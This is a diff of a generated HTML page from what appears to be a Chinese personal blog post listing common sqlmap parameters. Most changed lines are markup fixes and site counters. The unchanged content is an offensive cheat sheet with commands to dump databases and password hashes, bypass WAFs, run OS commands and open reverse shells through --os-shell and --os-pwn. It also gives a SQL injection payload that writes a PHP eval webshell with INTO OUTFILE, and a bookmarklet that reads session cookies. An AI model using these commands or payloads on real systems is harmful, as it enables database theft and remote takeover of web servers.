@@ -97,7 +97,7 @@
 <meta property="og:site_name" content="离沫凌天๓">
 <meta property="og:description" content="sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) –co">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2020-07-13T14:20:42.097Z">
+<meta property="og:updated_time" content="2020-08-09T16:17:15.419Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sqlmap常用参数">
 <meta name="twitter:description" content="sqlmap -u #注入点 -f #指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) –co">
@@ -436,7 +436,7 @@
 <li>-T “” #指定表名</li>
 <li>-C “” #指定字段</li>
 <li>-s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume)</li>
-<li>–columns #列出字段- </li>
+<li>–columns #列出字段-</li>
 <li>–current-user #获取当前用户名称</li>
 <li>–current-db #获取当前数据库名称</li>
 <li>–users #列数据库所有用户</li>
@@ -472,9 +472,9 @@
 <li>–union-tech orderby #union配合order by</li>
 <li>–method “POST” –data “” #POST方式提交数据(–method “POST” –data “page=1&amp;id=2″)</li>
 <li>–cookie “用;号分开” #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)</li>
-<li>–referer “” #使用referer欺骗(–referer “<a href="http://www.baidu.com”" target="_blank" rel="noopener">http://www.baidu.com”</a>)</li>
+<li>–referer “” #使用referer欺骗(–referer “<a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a>”)</li>
 <li>–user-agent “” #自定义user-agent</li>
-<li>–proxy “<a href="http://127.0.0.1:8118″" target="_blank" rel="noopener">http://127.0.0.1:8118″</a> #代理注入</li>
+<li>–proxy “<a href="http://127.0.0.1:8118" target="_blank" rel="noopener">http://127.0.0.1:8118</a>″ #代理注入</li>
 <li>–string “” #指定关键词</li>
 <li>–threads 　　 #采用多线程(–threads 3)</li>
 <li>–sql-shell #执行指定sql命令</li>
@@ -491,10 +491,10 @@
 <li>–reg-read #读取win系统注册表</li>
 <li>–priv-esc #</li>
 <li>–time-sec= #延迟设置 默认–time-sec=5 为5秒</li>
-<li>-p “user-agent” –user-agent “sqlmap/0.7rc1 (<a href="http://sqlmap.sourceforge.net)”" target="_blank" rel="noopener">http://sqlmap.sourceforge.net)”</a> #指定user-agent注入</li>
+<li>-p “user-agent” –user-agent “sqlmap/0.7rc1 (<a href="http://sqlmap.sourceforge.net" target="_blank" rel="noopener">http://sqlmap.sourceforge.net</a>)” #指定user-agent注入</li>
 <li>–eta #盲注</li>
 </ul>
-<h3 id="1-基础用法："><a href="#1-基础用法：" class="headerlink" title="1. 基础用法："></a>1. 基础用法：</h3><ul>
+<h3 id="1-基础用法"><a href="#1-基础用法" class="headerlink" title="1. 基础用法"></a>1. 基础用法</h3><ul>
 <li>./sqlmap.py -u “注入地址” -v 1 –dbs   // 列举数据库</li>
 <li>./sqlmap.py -u “注入地址” -v 1 –current-db   // 当前数据库</li>
 <li>./sqlmap.py -u “注入地址” -v 1 –users    // 列数据库用户</li>
@@ -519,7 +519,7 @@
 <li>默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用–level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer，那么这就很简单了，我们直接在原有的基础  上面加上 –level 2 即可<br>利用sqlmap cookies注入突破用户登录继续注入<br>先把用户登陆的cookie拿到吧，<br>在收藏夹添加一个链接cookies属性：<br>名字自己取<br>javascript:alert(document.cookie)，，需要获取当前cookie的时候，<br>直接点一下这个链接，然后复制一下弹出对话框<br>里的cookie值就搞定了<br>sqlmap.py -u <a href="http://x.x.x.x/Down.aspx?tid=2" target="_blank" rel="noopener">http://x.x.x.x/Down.aspx?tid=2</a> -p tid –dbms mssql –cookie=”info=username=test”<br>-p是指指定参数注入</li>
 </ul>
 <h3 id="4-sqlmap遇到url重写的注入"><a href="#4-sqlmap遇到url重写的注入" class="headerlink" title="4. sqlmap遇到url重写的注入"></a>4. sqlmap遇到url重写的注入</h3><ul>
-<li>哪里存在注入就加上 <em> 号<br>./sqlmap.py -u “<a href="http://www.cunlide.com/id1/1" target="_blank" rel="noopener">http://www.cunlide.com/id1/1</a></em>/id2/2”</li>
+<li>哪里存在注入就加上 <em>号<br>./sqlmap.py -u “<a href="http://www.cunlide.com/id1/1" target="_blank" rel="noopener">http://www.cunlide.com/id1/1</a></em>/id2/2”</li>
 </ul>
 <h3 id="5-sqlmap-编码绕waf注入"><a href="#5-sqlmap-编码绕waf注入" class="headerlink" title="5. sqlmap 编码绕waf注入"></a>5. sqlmap 编码绕waf注入</h3><p>在sqlmap 的 tamper目录下有很多space2morehash.py 编码脚本自行加载</p>
 <ul>
@@ -547,7 +547,7 @@
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs#列数据库</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–passwords #数据库用户密码</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–passwords-U root  -v 0 #列出指定用户数据库密码</li>
-<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表 </li>
+<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dump-all -v 0 #列出所有数据库所有表</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–privileges #查看权限</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–privileges -U root #查看指定用户权限</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –is-dba -v 1 #是否是数据库管理员</li>
@@ -565,18 +565,18 @@
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart-v 1 -f #指纹判别数据库类型</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;</a> –level=3 –smart–proxy”<a href="http://127.0.0.1:8118&quot;" target="_blank" rel="noopener">http://127.0.0.1:8118&quot;</a> #代理注入</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;" target="_blank" rel="noopener">http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;</a>  #指定关键词</li>
-<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–sql-shell #执行指定sql命令</li>
-</ul>
-<ul>
-<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令</li>
+<li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–sql-shell #执行指定sql命令</p>
+</li>
+<li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-cmd=whoami #执行系统命令</p>
+</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-shell #系统交互shell</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–os-pwn #反弹shell</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql”–reg-read #读取win系统注册表</li>
 <li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs-o “sqlmap.log” #保存进度</li>
-<li>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs  -o “sqlmap.log” –resume  #恢复已保存进度</li>
-</ul>
-<ul>
-<li>./sqlmap.py -u “<a href="http://www.91ri.org/" target="_blank" rel="noopener">http://www.91ri.org/</a> id1/1*/id2/2″<br>“Show.asp” –cookie “id=9” –table –level 2<br>–forms<br>–data “data”<br>–delay 0.5<br>–safe-freq  25<br>-v 3 –dbs  –batch –tamper “base64encode.py”<br>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump-all -v </li>
+<li><p>sqlmap -u “<a href="http://url/news?id=1&quot;--level=3" target="_blank" rel="noopener">http://url/news?id=1&quot;--level=3</a> –smart –dbms “Mysql” –dbs  -o “sqlmap.log” –resume  #恢复已保存进度</p>
+</li>
+<li><p>./sqlmap.py -u “<a href="http://www.91ri.org/" target="_blank" rel="noopener">http://www.91ri.org/</a> id1/1*/id2/2″<br>“Show.asp” –cookie “id=9” –table –level 2<br>–forms<br>–data “data”<br>–delay 0.5<br>–safe-freq  25<br>-v 3 –dbs  –batch –tamper “base64encode.py”<br>sqlmap.py -u url -D “data”  -T “tables” -C “username,password,email” –dump-all -v</p>
+</li>
 </ul>
 <h2 id="传统的sql语句写shell"><a href="#传统的sql语句写shell" class="headerlink" title="传统的sql语句写shell"></a>传统的sql语句写shell</h2><p>通过sql注入select into outfile实现，如：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,&apos;&lt;?php eval($_POST[a]);?&gt;&apos; INTO OUTFILE &apos;/var/www/tmp/nb.php&apos;#</span><br></pre></td></tr></table></figure>
@@ -594,7 +594,8 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--os-shell</span><br></pre></td></tr></table></figure>
 <p>写webshell，会生成两个文件，tmpbshrd.php和tmpucnll.php，分别为命令执行和文件上传webshell</p>
 <p>关闭sqlmap文件就会被删除</p>
-<h2 id="常见数据库端口号"><a href="#常见数据库端口号" class="headerlink" title="常见数据库端口号"></a>常见数据库端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Oracle 默认1521</span><br><span class="line"></span><br><span class="line">SQL Server 默认1433</span><br><span class="line"></span><br><span class="line">Mysql默认3306</span><br><span class="line"></span><br><span class="line">21 FTP </span><br><span class="line"></span><br><span class="line">22 ssh</span><br><span class="line"></span><br><span class="line">23 telnet</span><br><span class="line"></span><br><span class="line">25 smtp</span><br><span class="line"></span><br><span class="line">109 110 pop2 pop3</span><br></pre></td></tr></table></figure>
+<h2 id="常见数据库端口号"><a href="#常见数据库端口号" class="headerlink" title="常见数据库端口号"></a>常见数据库端口号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Oracle 默认1521</span><br><span class="line"></span><br><span class="line">SQL Server 默认1433</span><br><span class="line"></span><br><span class="line">Mysql默认3306</span><br><span class="line"></span><br><span class="line">21 FTP</span><br><span class="line"></span><br><span class="line">22 ssh</span><br><span class="line"></span><br><span class="line">23 telnet</span><br><span class="line"></span><br><span class="line">25 smtp</span><br><span class="line"></span><br><span class="line">109 110 pop2 pop3</span><br></pre></td></tr></table></figure>
+
       
     </div>
     
@@ -715,7 +716,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -726,7 +727,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -737,7 +738,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -777,7 +778,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap"><span class="nav-number">1.</span> <span class="nav-text">sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-基础用法："><span class="nav-number">1.1.</span> <span class="nav-text">1. 基础用法：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-sqlmap-post注入"><span class="nav-number">1.2.</span> <span class="nav-text">2. sqlmap post注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-sqlmap-cookies注入"><span class="nav-number">1.3.</span> <span class="nav-text">3. sqlmap  cookies注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-sqlmap遇到url重写的注入"><span class="nav-number">1.4.</span> <span class="nav-text">4. sqlmap遇到url重写的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-sqlmap-编码绕waf注入"><span class="nav-number">1.5.</span> <span class="nav-text">5. sqlmap 编码绕waf注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息获取"><span class="nav-number">2.</span> <span class="nav-text">信息获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传统的sql语句写shell"><span class="nav-number">3.</span> <span class="nav-text">传统的sql语句写shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap写shell"><span class="nav-number">4.</span> <span class="nav-text">sqlmap写shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见数据库端口号"><span class="nav-number">5.</span> <span class="nav-text">常见数据库端口号</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap"><span class="nav-number">1.</span> <span class="nav-text">sqlmap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-基础用法"><span class="nav-number">1.1.</span> <span class="nav-text">1. 基础用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-sqlmap-post注入"><span class="nav-number">1.2.</span> <span class="nav-text">2. sqlmap post注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-sqlmap-cookies注入"><span class="nav-number">1.3.</span> <span class="nav-text">3. sqlmap  cookies注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-sqlmap遇到url重写的注入"><span class="nav-number">1.4.</span> <span class="nav-text">4. sqlmap遇到url重写的注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-sqlmap-编码绕waf注入"><span class="nav-number">1.5.</span> <span class="nav-text">5. sqlmap 编码绕waf注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#信息获取"><span class="nav-number">2.</span> <span class="nav-text">信息获取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传统的sql语句写shell"><span class="nav-number">3.</span> <span class="nav-text">传统的sql语句写shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap写shell"><span class="nav-number">4.</span> <span class="nav-text">sqlmap写shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常见数据库端口号"><span class="nav-number">5.</span> <span class="nav-text">常见数据库端口号</span></a></li></ol></div>
             
 
           </div>
@@ -828,7 +829,7 @@
     <!-- 博客字数统计 -->
     <span class="site-pv">
       <i class="fa fa-pencil"></i>
-    全站字数：<span class="post-count">25.7k</span>
+    全站字数：<span class="post-count">61.2k</span>
     </span>
 </div>
 
